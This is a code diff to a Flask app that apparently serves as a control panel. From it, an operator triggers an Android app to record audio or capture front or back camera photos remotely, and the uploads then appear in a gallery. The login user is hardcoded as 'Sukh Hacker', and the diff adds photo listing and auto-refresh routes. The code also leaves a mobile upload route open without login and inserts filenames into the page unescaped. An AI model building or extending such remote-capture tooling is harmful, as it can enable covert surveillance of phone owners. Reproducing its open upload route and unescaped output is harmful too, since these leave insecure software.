@@ -17,6 +17,7 @@ os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
 # Global variable to track recording signal
 recording_signal = False
 signal_listeners = []
+camera_signal = {'active': False}
 
 # Simple authentication
 USERNAME = "Sukh Hacker"
@@ -45,35 +46,41 @@ def dashboard():
     if not session.get('logged_in'):
         return redirect(url_for('login'))
     
-    # List audio files
+    # List all files (audio + photos)
     files = []
+    photos = []
     upload_dir = app.config['UPLOAD_FOLDER']
     try:
         for filename in os.listdir(upload_dir):
+            filepath = os.path.join(upload_dir, filename)
+            file_info = {
+                'name': filename,
+                'size': os.path.getsize(filepath),
+                'modified': os.path.getmtime(filepath)
+            }
+            
             if filename.endswith(('.m4a', '.mp3', '.wav', '.mp4')):
-                filepath = os.path.join(upload_dir, filename)
-                files.append({
-                    'name': filename,
-                    'size': os.path.getsize(filepath),
-                    'modified': os.path.getmtime(filepath)
-                })
+                files.append(file_info)
+            elif filename.endswith(('.jpg', '.jpeg', '.png')):
+                photos.append(file_info)
+                
     except FileNotFoundError:
         os.makedirs(upload_dir, exist_ok=True)
     
     # Sort by modification time (newest first)
     files.sort(key=lambda x: x['modified'], reverse=True)
+    photos.sort(key=lambda x: x['modified'], reverse=True)
     
-    return render_template_string(DASHBOARD_HTML, files=files)
+    return render_template_string(DASHBOARD_HTML, files=files, photos=photos[:6])  # Latest 6 photos
 
-
-# Camera routes - YE ADD KARO
+# Camera routes
 @app.route('/start-camera-signal', methods=['POST'])
 def start_camera_signal():
     if not session.get('logged_in'):
         return jsonify({'ok': False, 'error': 'unauthorized'}), 401
     
     data = request.get_json()
-    camera_type = data.get('camera_type', 'front')  # 'front' or 'back'
+    camera_type = data.get('camera_type', 'front')
     
     global camera_signal
     camera_signal = {
@@ -89,7 +96,6 @@ def start_camera_signal():
 def check_camera_signal():
     global camera_signal
     if camera_signal and camera_signal.get('active'):
-        # Signal 30 seconds tak valid rahega
         if time.time() - camera_signal.get('timestamp', 0) < 30:
             return jsonify({
                 'capture': True,
@@ -129,11 +135,7 @@ def upload_photo():
     
     return jsonify({'ok': False, 'error': 'Upload failed'}), 500
 
-# Global variables mein yeh ADD karo
-camera_signal = {'active': False}
-
 # Recording signal routes
-# Recording signal routes - YE WALA USE KARO
 @app.route('/start-recording', methods=['POST'])
 def start_recording():
     if not session.get('logged_in'):
@@ -142,15 +144,13 @@ def start_recording():
     global recording_signal
     recording_signal = True
     
-    # Get recording time from request
-    record_time = 15  # default
+    record_time = 15
     if request.is_json:
         data = request.get_json()
         record_time = data.get('record_time', 15)
     
     print(f"Recording signal activated - {record_time} seconds")
     
-    # Notify all listeners
     for listener in signal_listeners:
         listener['active'] = False
     
@@ -158,14 +158,13 @@ def start_recording():
 
 @app.route('/check-signal')
 def check_signal():
-    # This endpoint will be polled by Android app
     global recording_signal
     return jsonify({'record': recording_signal})
 
 @app.route('/signal-received', methods=['POST'])
 def signal_received():
     global recording_signal
-    recording_signal = False  # Reset signal after app acknowledges
+    recording_signal = False
     return jsonify({'ok': True})
 
 # File management routes
@@ -218,7 +217,6 @@ def upload_recording():
     
     if audio_file:
         filename = secure_filename(audio_file.filename)
-        # Add timestamp to avoid overwrites
         name, ext = os.path.splitext(filename)
         timestamp = str(int(time.time()))
         filename = f"{name}_{timestamp}{ext}"
@@ -229,14 +227,13 @@ def upload_recording():
         return jsonify({'ok': True, 'message': 'Upload successful', 'filename': filename})
     
     return jsonify({'ok': False, 'error': 'Upload failed'}), 500
-# MOBILE UPLOAD ROUTE - ANDROID APP KE LIYE (NO LOGIN REQUIRED)
+
+# Mobile upload route
 @app.route('/mobile-upload', methods=['POST'])
 def mobile_upload():
     try:
-        # Debug - check what files are being received
         print("Files received:", list(request.files.keys()))
         
-        # Android app 'file' naam se bhejta hai, web 'audio' naam se
         audio_file = None
         if 'file' in request.files:
             audio_file = request.files['file']
@@ -248,7 +245,6 @@ def mobile_upload():
         if not audio_file or audio_file.filename == '':
             return jsonify({'ok': False, 'error': 'No file selected'}), 400
         
-        # File save karo
         timestamp = str(int(time.time()))
         filename = f"android_recording_{timestamp}.m4a"
         
@@ -261,6 +257,29 @@ def mobile_upload():
     except Exception as e:
         print(f"❌ Upload error: {e}")
         return jsonify({'ok': False, 'error': 'Upload failed'}), 500
+
+# Get latest photos API
+@app.route('/get-latest-photos')
+def get_latest_photos():
+    if not session.get('logged_in'):
+        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
+    
+    photos = []
+    upload_dir = app.config['UPLOAD_FOLDER']
+    try:
+        for filename in os.listdir(upload_dir):
+            if filename.endswith(('.jpg', '.jpeg', '.png')):
+                filepath = os.path.join(upload_dir, filename)
+                photos.append({
+                    'name': filename,
+                    'url': f"/files/{filename}",
+                    'modified': os.path.getmtime(filepath)
+                })
+    except FileNotFoundError:
+        pass
+    
+    photos.sort(key=lambda x: x['modified'], reverse=True)
+    return jsonify({'ok': True, 'photos': photos[:6]})
 
 # LOGIN_HTML template
 LOGIN_HTML = """
@@ -297,7 +316,6 @@ input[type="text"],input[type="password"]{width:100%;padding:12px;border:1px sol
 """
 
 # DASHBOARD_HTML template
-# DASHBOARD_HTML template - YE WALA USE KARO
 DASHBOARD_HTML = """
 <!doctype html>
 <title>Guard Recordings & Camera</title>
@@ -311,7 +329,6 @@ h1{color:#0b74ff;margin:0}
 .btn-start{background:#28a745;color:#fff}
 .btn-stop{background:#dc3545;color:#fff}
 .btn-recorder{background:#0b74ff;color:#fff;text-decoration:none;display:inline-block}
-.btn-camera{background:#ff6b00;color:#fff}
 .btn-camera-front{background:#17a2b8;color:#fff}
 .btn-camera-back{background:#6f42c1;color:#fff}
 .signal-status{padding:8px 12px;border-radius:6px;margin-left:12px;font-size:14px}
@@ -332,10 +349,13 @@ audio{width:240px}
 .control-group label{display:block;margin-bottom:5px;font-weight:500}
 .control-group input{width:100px;padding:8px;border:1px solid #ddd;border-radius:4px;font-size:14px}
 .photo-gallery{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:15px;margin-top:20px}
-.photo-item{border:1px solid #ddd;border-radius:8px;overflow:hidden}
-.photo-item img{width:100%;height:150px;object-fit:cover}
-.photo-info{padding:10px;background:#f8f9fa}
+.photo-item{border:1px solid #ddd;border-radius:8px;overflow:hidden;background:#fff}
+.photo-item img{width:100%;height:150px;object-fit:cover;cursor:pointer;transition:transform 0.2s}
+.photo-item img:hover{transform:scale(1.05)}
+.photo-info{padding:10px;background:#f8f9fa;border-top:1px solid #eee}
+.photo-name{font-size:12px;color:#666;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
 .section-title{font-size:18px;font-weight:600;margin-bottom:15px;color:#333;border-bottom:2px solid #0b74ff;padding-bottom:5px}
+.refresh-btn{background:#6c757d;color:#fff;padding:8px 12px;border:none;border-radius:4px;cursor:pointer;font-size:12px;margin-left:10px}
 </style>
 <div class="container">
   <header>
@@ -348,7 +368,10 @@ audio{width:240px}
   
   <!-- Camera Controls Section -->
   <div class="camera-controls">
-    <div class="section-title">📸 Remote Camera Control</div>
+    <div class="section-title">
+      📸 Remote Camera Control 
+      <button class="refresh-btn" onclick="refreshPhotos()">🔄 Refresh Photos</button>
+    </div>
     
     <div class="controls">
       <button class="btn btn-camera-front" onclick="startCamera('front')">📱 Front Camera</button>
@@ -359,9 +382,25 @@ audio{width:240px}
     
     <div id="cameraInfo" class="small" style="margin-top:10px;color:#666;"></div>
     
-    <!-- Photo Gallery -->
+    <!-- Live Photo Gallery -->
+    <div class="section-title">🖼️ Latest Photos</div>
     <div class="photo-gallery" id="photoGallery">
-      <!-- Photos yahan load hongi -->
+      {% for photo in photos %}
+      <div class="photo-item">
+        <img src="{{ url_for('serve_file', filename=photo.name) }}" 
+             onclick="openPhoto('{{ url_for('serve_file', filename=photo.name) }}')"
+             alt="{{ photo.name }}">
+        <div class="photo-info">
+          <div class="photo-name">{{ photo.name }}</div>
+          <div class="small">{{ '%.1f'|format(photo.size / 1024) }} KB</div>
+        </div>
+      </div>
+      {% endfor %}
+      {% if photos|length == 0 %}
+      <div class="small" style="grid-column:1/-1;text-align:center;padding:40px;color:#999">
+        No photos captured yet. Click camera buttons above to capture photos.
+      </div>
+      {% endif %}
     </div>
   </div>
   
@@ -383,7 +422,7 @@ audio{width:240px}
     <div id="recordingInfo" class="small" style="margin-top:10px;color:#666;"></div>
   </div>
   
-  <p class="small">Total files: <strong>{{ files|length }}</strong></p>
+  <p class="small">Total files: <strong>{{ files|length + photos|length }}</strong> ({{ files|length }} audio, {{ photos|length }} photos)</p>
 
   <table>
     <thead>
@@ -394,21 +433,8 @@ audio{width:240px}
       <tr>
         <td style="max-width:320px;word-break:break-all">{{ f.name }}</td>
         <td class="small">{{ '%.1f'|format(f.size / 1024) }}</td>
-        <td class="small">
-          {% if f.name.endswith('.jpg') or f.name.endswith('.jpeg') or f.name.endswith('.png') %}
-            📸 Photo
-          {% else %}
-            🎧 Audio
-          {% endif %}
-        </td>
-        <td>
-          {% if f.name.endswith('.jpg') or f.name.endswith('.jpeg') or f.name.endswith('.png') %}
-            <img src="{{ url_for('serve_file', filename=f.name) }}" style="width:80px;height:60px;object-fit:cover;border-radius:4px;cursor:pointer" 
-                 onclick="openPhoto('{{ url_for('serve_file', filename=f.name) }}')">
-          {% else %}
-            <audio controls preload="none"><source src="{{ url_for('serve_file', filename=f.name) }}" type="audio/mp4"></audio>
-          {% endif %}
-        </td>
+        <td class="small">🎧 Audio</td>
+        <td><audio controls preload="none"><source src="{{ url_for('serve_file', filename=f.name) }}" type="audio/mp4"></audio></td>
         <td><a class="btn-small btn-download" href="{{ url_for('serve_file', filename=f.name) }}" download>⬇️ Download</a></td>
         <td>
           <form method="post" action="{{ url_for('delete_file', filename=f.name) }}" onsubmit="return confirm('Delete file\\\\n\\\\n' + '{{f.name}}' + '\\\\n\\\\nThis cannot be undone. Continue?')">
@@ -417,7 +443,25 @@ audio{width:240px}
         </td>
       </tr>
     {% endfor %}
-    {% if files|length == 0 %}
+    {% for p in photos %}
+      <tr>
+        <td style="max-width:320px;word-break:break-all">{{ p.name }}</td>
+        <td class="small">{{ '%.1f'|format(p.size / 1024) }}</td>
+        <td class="small">📸 Photo</td>
+        <td>
+          <img src="{{ url_for('serve_file', filename=p.name) }}" 
+               style="width:80px;height:60px;object-fit:cover;border-radius:4px;cursor:pointer" 
+               onclick="openPhoto('{{ url_for('serve_file', filename=p.name) }}')">
+        </td>
+        <td><a class="btn-small btn-download" href="{{ url_for('serve_file', filename=p.name) }}" download>⬇️ Download</a></td>
+        <td>
+          <form method="post" action="{{ url_for('delete_file', filename=p.name) }}" onsubmit="return confirm('Delete photo\\\\n\\\\n' + '{{p.name}}' + '\\\\n\\\\nThis cannot be undone. Continue?')">
+            <button class="btn-small btn-delete" type="submit">Delete</button>
+          </form>
+        </td>
+      </tr>
+    {% endfor %}
+    {% if files|length == 0 and photos|length == 0 %}
       <tr><td colspan="6" class="small">No files yet.</td></tr>
     {% endif %}
     </tbody>
@@ -487,7 +531,11 @@ function startCamera(cameraType) {
             document.getElementById('cameraStatus').textContent = `Camera: ${cameraName} Active`;
             
             cameraCheckInterval = setInterval(checkCameraStatus, 2000);
-            setTimeout(() => stopCamera(), 30000);
+            setTimeout(() => {
+                stopCamera();
+                // Photo capture ke baad gallery refresh karo
+                setTimeout(refreshPhotos, 3000);
+            }, 30000);
         }
     })
     .catch(err => console.error('Error:', err));
@@ -504,7 +552,11 @@ function checkCameraStatus() {
     fetch('/check-camera-signal')
     .then(r => r.json())
     .then(data => {
-        if(!data.capture) stopCamera();
+        if(!data.capture) {
+            stopCamera();
+            // Signal complete hone par gallery refresh karo
+            setTimeout(refreshPhotos, 2000);
+        }
     });
 }
 
@@ -512,16 +564,38 @@ function openPhoto(photoUrl) {
     window.open(photoUrl, '_blank');
 }
 
+// Photo Gallery Functions
+function refreshPhotos() {
+    fetch('/get-latest-photos')
+    .then(r => r.json())
+    .then(data => {
+        if(data.ok) {
+            const gallery = document.getElementById('photoGallery');
+            if(data.photos.length === 0) {
+                gallery.innerHTML = '<div class="small" style="grid-column:1/-1;text-align:center;padding:40px;color:#999">No photos captured yet. Click camera buttons above to capture photos.</div>';
+                return;
+            }
+            
+            gallery.innerHTML = data.photos.map(photo => `
+                <div class="photo-item">
+                    <img src="${photo.url}" onclick="openPhoto('${photo.url}')" alt="${photo.name}">
+                    <div class="photo-info">
+                        <div class="photo-name">${photo.name}</div>
+                    </div>
+                </div>
+            `).join('');
+        }
+    })
+    .catch(err => console.error('Error refreshing photos:', err));
+}
+
+// Auto-refresh photos every 10 seconds
+setInterval(refreshPhotos, 10000);
+
 // Load photos on page load
 document.addEventListener('DOMContentLoaded', function() {
-    loadPhotoGallery();
+    refreshPhotos();
 });
-
-function loadPhotoGallery() {
-    // Recent photos display karega
-    const gallery = document.getElementById('photoGallery');
-    gallery.innerHTML = '<div class="small">Recent photos will appear here</div>';
-}
 
 // Update recording info when input changes
 document.getElementById('recordTime').addEventListener('change', function() {
@@ -531,7 +605,8 @@ document.getElementById('recordTime').addEventListener('change', function() {
 });
 </script>
 """
-# RECORDER_HTML template
+
+# RECORDER_HTML template (same as before)
 RECORDER_HTML = """
 <!doctype html>
 <title>Audio Recorder</title>
@@ -587,7 +662,6 @@ async function startRecording() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
         
-        // Setup audio visualization
         audioContext = new (window.AudioContext || window.webkitAudioContext)();
         analyser = audioContext.createAnalyser();
         const source = audioContext.createMediaStreamSource(stream);
@@ -635,7 +709,6 @@ function stopRecording() {
         statusSpan.textContent = 'Recording Stopped';
         statusSpan.className = 'recording-status not-recording';
         
-        // Stop all tracks
         mediaRecorder.stream.getTracks().forEach(track => track.stop());
     }
 }
